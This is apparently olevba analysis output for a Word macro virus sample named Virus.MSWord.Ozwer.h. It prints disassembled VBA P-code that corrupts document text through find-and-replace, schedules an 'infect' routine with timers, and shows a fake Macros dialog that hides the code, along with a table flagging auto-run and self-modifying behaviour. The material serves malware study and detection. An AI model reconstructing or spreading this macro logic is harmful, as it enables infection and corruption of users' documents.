' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #176:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #177:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #178:
' 	LitStr 0x0001 "0"
' 	MemStWith Then 
' Line #179:
' 	LitStr 0x0002 "10"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #180:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #181:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #182:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #183:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #184:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #185:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #186:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #187:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #188:
' 	EndWith 
' Line #189:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #190:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #191:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #192:
' 	LitStr 0x0001 "o"
' 	MemStWith Then 
' Line #193:
' 	LitStr 0x0001 "8"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #194:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #195:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #196:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #197:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #198:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #199:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #200:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #201:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #202:
' 	EndWith 
' Line #203:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #204:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #205:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #206:
' 	LitStr 0x0001 "e"
' 	MemStWith Then 
' Line #207:
' 	LitStr 0x0001 "d"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #208:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #209:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #210:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #211:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #212:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #213:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #214:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #215:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #216:
' 	EndWith 
' Line #217:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #218:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #219:
' 	LitStr 0x0001 "b"
' 	MemStWith Then 
' Line #220:
' 	LitStr 0x0001 "c"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #221:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #222:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #223:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #224:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #225:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #226:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #227:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #228:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #229:
' 	EndWith 
' Line #230:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #231:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #232:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #233:
' 	LitStr 0x0002 "de"
' 	MemStWith Then 
' Line #234:
' 	LitStr 0x0007 "COURIER"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #235:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #236:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #238:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #240:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #241:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #242:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #243:
' 	EndWith 
' Line #244:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #245:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0000 
' Line #246:
' 	EndSub 
' Line #247:
' 	FuncDefn (Sub timer())
' Line #248:
' 	Ld Now 
' 	LitStr 0x0008 "00:20:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0004 "cor2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #249:
' 	Ld Now 
' 	LitStr 0x0008 "00:35:35"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0006 "infect"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #250:
' 	EndSub 
' Line #251:
' Macros/VBA/cor - 7566 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' 	Option  (Explicit)
' Line #101:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #102:
' 	ArgsCall Beep 0x0000 
' Line #103:
' 	ArgsCall Beep 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	Ld cor 
' 	ArgsMemCall Hide 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #110:
' 	ArgsCall Beep 0x0000 
' Line #111:
' 	ArgsCall Beep 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #114:
' 	ArgsCall Beep 0x0000 
' Line #115:
' 	ArgsCall Beep 0x0000 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #118:
' 	ArgsCall Beep 0x0000 
' Line #119:
' 	ArgsCall Beep 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #122:
' 	ArgsCall Beep 0x0000 
' Line #123:
' 	ArgsCall Beep 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #126:
' 	ArgsCall Beep 0x0000 
' Line #127:
' 	ArgsCall Beep 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Private Sub userform_initialize())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Dim 
' 	VarDefn user
' 	VarDefn docn
' 	VarDefn PyD
' 	VarDefn Pg
' 	VarDefn Cw
' 	VarDefn Dc
' 	VarDefn Mc
' 	VarDefn Pr
' 	VarDefn letr (As String)
' Line #132:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #133:
' 	Ld letr 
' 	SelectCase 
' Line #134:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #135:
' 	LitStr 0x0024 "Todos os Modelos e documentos ativos"
' 	St PyD 
' Line #136:
' 	LitStr 0x001D "Normal.dot (plantilla global)"
' 	St Pg 
' Line #137:
' 	LitStr 0x0010 "Comandos do Word"
' 	St Cw 
' Line #138:
' 	LitStr 0x000C " (documento)"
' 	St Dc 
' Line #139:
' 	LitStr 0x0012 "Macros criadas em "
' 	St Mc 
' Line #140:
' 	LitStr 0x0005 " por "
' 	St Pr 
' Line #141:
' 	LitStr 0x0008 "Executar"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #142:
' 	LitStr 0x0039 "Executa uma macro selecionada (não há macros disponíveis)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #143:
' 	LitStr 0x0008 "Cancelar"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #144:
' 	LitStr 0x0010 "Cancelar seleção"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #145:
' 	LitStr 0x000D "Passo a passo"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #146:
' 	LitStr 0x0025 "Executa macro instrução por instrução"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #147:
' 	LitStr 0x0009 "Modificar"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #148:
' 	LitStr 0x0037 "Modificar macro selecionada (não há macros disponíveis)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
' Line #149:
' 	LitStr 0x0005 "Criar"
' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #150:
' 	LitStr 0x0025 "Criar uma macro nova (não disponivel)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #151:
' 	LitStr 0x0007 "Excluir"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #152:
' 	LitStr 0x0035 "Excluir macro selecionada (não há macros disponíveis)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #153:
' 	LitStr 0x000E "Organizador..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #154:
' 	LitStr 0x000E "Nome do macro:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #155:
' 	LitStr 0x000A "Macros em:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #156:
' 	LitStr 0x000A "Descrição:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #157:
' Line #158:
' Line #159:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #160:
' 	LitStr 0x0022 "All templates and active documents"
' 	St PyD 
' Line #161:
' 	LitStr 0x001C "Normal.dot (global template)"
' 	St Pg 
' Line #162:
' 	LitStr 0x000D "Word commands"
' 	St Cw 
' Line #163:
' 	LitStr 0x000B " (document)"
' 	St Dc 
' Line #164:
' 	LitStr 0x000F "Macros made on "
' 	St Mc 
' Line #165:
' 	LitStr 0x0004 " by "
' 	St Pr 
' Line #166:
' 	LitStr 0x0003 "Run"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #167:
' 	LitStr 0x0028 "Run selected macro (no macros available)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #168:
' 	LitStr 0x0006 "Cancel"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #169:
' 	LitStr 0x0010 "Cancel selection"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #170:
' 	LitStr 0x000C "Step by step"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #171:
' 	LitStr 0x0016 "Run macro step by step"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #172:
' 	LitStr 0x0006 "Modify"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #173:
' 	LitStr 0x0038 "Modify selected macro seleccionada (no macros available)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
' Line #174:
' 	LitStr 0x0003 "New"
' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #175:
' 	LitStr 0x0022 "Create a new macro (not available)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #176:
' 	LitStr 0x0006 "Delete"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #177:
' 	LitStr 0x0029 "Delete selected macro (no macro selected)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #178:
' 	LitStr 0x000C "Organizer..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #179:
' 	LitStr 0x000B "Macro name:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #180:
' 	LitStr 0x000A "Macros in:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #181:
' 	LitStr 0x000C "Description:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #182:
' 	EndSelect 
' Line #183:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St docn 
' Line #184:
' 	Ld Application 
' 	MemLd UserName 
' 	St user 
' Line #185:
' 	Ld PyD 
' 	Ld ComboBox1 
' 	MemSt Then 
' Line #186:
' 	Ld PyD 
' 	Paren 
' 	LitDI2 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #187:
' 	Ld Pg 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #188:
' 	Ld Cw 
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #189:
' 	Ld docn 
' 	Ld Dc 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0003 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #190:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0004 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #191:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0005 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #192:
' 	Ld Mc 
' 	Ld Date 
' 	Concat 
' 	Ld Pr 
' 	Concat 
' 	Ld user 
' 	Concat 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #193:
' Line #194:
' 	EndSub 
' Line #195:
' 	Rem 0x000D " Courier é 10"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Editar@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Executar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Criar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Passo a Passo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Biblioteca...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Excluir
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Ozwer.h' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

